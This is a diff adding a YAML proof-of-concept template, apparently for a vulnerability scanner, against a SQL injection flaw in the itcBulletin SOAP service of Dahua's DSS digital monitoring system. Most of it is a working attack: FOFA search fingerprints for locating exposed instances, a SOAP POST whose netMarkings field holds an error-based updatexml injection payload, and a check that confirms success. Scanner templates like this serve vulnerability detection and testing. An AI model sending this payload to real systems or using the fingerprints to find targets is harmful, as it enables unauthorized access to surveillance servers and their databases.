@@ -1,0 +1,21 @@
+id: poc-yaml-dahua-dss-digital-monitoring-system-itcbulletin-sqli
+info:
+  name: 大华 DSS 数字监控系统 itcBulletin SQL 注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 大华 DSS 数字监控系统
+  fofa: body="<meta http-equiv=\"refresh\" content=\"1;url='/admin'\"></span>" ||
+    body="dahuaDefined/headCommon.js" || title=="DSS"
+variables:
+  t1: random_int(1,1000)
+requests:
+- method: POST
+  path: /portal/services/itcBulletin?wsdl
+  data: "<s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>\n<s11:Body>\n\
+    <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>\n\
+    <netMarkings>\n (updatexml(1,concat(0x7e,(select md5(\"{{.t1}}\")),0x7e),1)))\
+    \ and (1=1\n</netMarkings>\n</ns1:deleteBulletin>\n</s11:Body>\n</s11:Envelope>"
+  expression: status_code == 500 && contains(body,substr(md5(t1),1,30)) && contains(body,"XPATH
+    syntax error")
+transport: http
